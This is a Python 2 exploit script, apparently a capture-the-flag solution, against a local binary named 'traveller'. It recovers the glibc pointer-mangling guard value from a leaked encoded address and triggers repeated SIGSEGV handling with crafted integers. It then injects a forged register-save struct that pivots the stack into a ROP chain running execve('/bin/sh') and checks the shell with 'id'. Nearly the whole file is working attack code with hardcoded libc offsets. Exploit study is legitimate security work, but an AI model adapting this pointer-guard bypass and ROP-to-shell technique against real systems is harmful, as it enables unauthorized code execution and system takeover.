import sys
import os
from subprocess import *
import struct

def rshift(val, n):
  return val>>n if val >= 0 else (val+0x100000000)>>n

def ror(i, c):
  return (rshift(i, c) |  (i << (32-c))) & 0xffffffff

def rol(i, c):
  return (i<<c | rshift(i, 32-c)) & 0xffffffff

def kill(signal, pid):
	os.system('kill -%d %d' % (signal, pid))

p = Popen('./traveller', stdin=PIPE, stdout=PIPE)

def readuntil(p, delim=''):
	d = ''
	while not d.endswith(delim):
		d += p.stdout.read(1)
	return d
		
# menu
min_num = -2147483648
orig_eip = 0x08048a47
print readuntil(p, 'instructions: ')
recv = readuntil(p, '\n')
encode_eip = int(recv, 10)
gs18 = ror(encode_eip, 0x9) ^ orig_eip
print 'gs:0x18: %s' % hex(gs18)
print readuntil(p, 'in val 0: ')
p.stdin.write(str(min_num) + '\n')
print readuntil(p, 'in val 1: ')
p.stdin.write(str(min_num) + '\n')
print readuntil(p, 'in val 2: ')
p.stdin.write(str(min_num) + '\n')

env = 0x0804a2bc - 0x80
fake_signal_stack = 'A' * 6
fake_signal_stack += struct.pack('<I', env)
fake_signal_stack += struct.pack('<I', 0)
fake_signal_stack += struct.pack('<I', 0x1000) 

assert('\n' not in fake_signal_stack)
print readuntil(p, 'In SIGSEGV handler, ')
recv = readuntil(p, '\n')
sp1 = int(recv[:-1], 16)
print readuntil(p, 'failure:\n')
p.stdin.write(fake_signal_stack + '\n')
print readuntil(p, 'in val 0: ')
p.stdin.write(str(min_num) + '\n')
print readuntil(p, 'in val 1: ')
p.stdin.write(str(min_num) + '\n')
print readuntil(p, 'in val 2: ')
p.stdin.write(str(min_num) + '\n')

print readuntil(p, 'In SIGSEGV handler, ')
recv = readuntil(p, '\n')
sp2 = int(recv[:-1], 16)
print readuntil(p, 'failure:\n')

print 'sp1: %s' % hex(sp1)
print 'sp2: %s' % hex(sp2)
print 'sp1 - sp2: %s' % hex(sp1 - sp2)

def xor_encode(target):
	return rol((target ^ gs18), 0x9)

libc_base = 0x5559c000
system = libc_base + 0x40190
binsh = libc_base + 0x160a24
ret = 0x0804854a
pop_eax_ret = libc_base + 0x2469f
pop_edx_ecx_ebx_ret = libc_base + 0xf9151
print 'hex: %s' % hex(pop_eax_ret)

cd80 = libc_base + 0x2e6a5

fake_stru_addr = 0x0804a220
fake_esp = 0x804d09e

'''
rop = struct.pack('<I', pop_eax_ret)
rop += struct.pack('<I', 0x11111111)
rop += struct.pack('<I', pop_edx_ecx_ebx_ret)
rop += struct.pack('<I', 0) * 2
rop += struct.pack('<I', binsh)
rop += struct.pack('<I', 0x49494949)
'''

rop = struct.pack('<I', 0x47474747) * 8
rop += struct.pack('<I', pop_eax_ret)
rop += struct.pack('<I', 11)
rop += struct.pack('<I', pop_edx_ecx_ebx_ret)
rop += struct.pack('<I', 0) * 2
rop += struct.pack('<I', binsh)
rop += struct.pack('<I', pop_eax_ret)
rop += struct.pack('<I', 11)
rop += struct.pack('<I', cd80)

fake_stru_struct = 'A' * 2
fake_stru_struct += struct.pack('<I', 0x41414141) * 3 
fake_stru_struct += struct.pack('<I', xor_encode(0x41414141)) # ebx
fake_stru_struct += struct.pack('<I', xor_encode(0x42424242)) # esp
fake_stru_struct += struct.pack('<I', xor_encode(0x43434343)) # ebp
fake_stru_struct += struct.pack('<I', xor_encode(0x44444444)) # esi
fake_stru_struct += struct.pack('<I', xor_encode(fake_esp)) # edi
fake_stru_struct += struct.pack('<I', xor_encode(ret)) # eip
#fake_stru_struct += struct.pack('<I' ,0x1)
#fake_stru_struct += struct.pack('<I', 0) * 32
fake_stru_struct += rop
 
assert('\n' not in fake_stru_struct)

raw_input('wait')
p.stdin.write(fake_stru_struct + '\n')

print p.stdout.readline()
print p.stdin.write('id\n')
print p.stdout.readline()
'''
target = 0x41414141
store = rol((target ^ gs18), 0x9)
content = struct.pack('<I', store) * (1000 / 4)
p.stdin.write(content + '\n')
print p.stdout.readline()
print p.stdout.readline()
print p.stdout.readline()
print p.stdout.readline()
print p.stdout.readline()
print readuntil(p, 'val 0: ')
kill(10, p.pid)
content = 'A' 
print readuntil(p, 'failure:\n')
kill(10, p.pid)
kill(11, p.pid)
p.stdin.write(content + '\n')

#kill(11, p.pid)
#content = 'A' * 126 + 'CB'
#p.stdin.write(content + '\n')
#print readuntil(p, 'C')
'''
